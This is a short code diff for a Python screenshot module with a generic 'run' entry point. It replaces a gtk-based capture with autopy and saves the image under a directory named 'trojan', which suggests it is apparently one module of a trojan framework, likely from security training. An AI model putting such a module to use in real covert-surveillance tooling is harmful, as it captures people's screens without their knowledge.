@@ -1,15 +1,10 @@
-import gtk.gdk
+import autopy
+import time
 
 def run(**args):
- w = gtk.gdk.get_default_root_window()
- sz = w.get_size()
- print ("The size of the window is %d x %d" % sz)
- pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
- pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
- if (pb != None):
-    pb.save("screenshot.png","png")
-    print ("Screenshot saved to screenshot.png.")
- else:
-    print ("Unable to get the screenshot.")
+  print("taking screenshot...")
+  time.sleep(2)
+  b = autopy.bitmap.capture_screen()
+  b.save("/root/Desktop/trojan/screenshot.png")
 
- return (pb)
+  return b
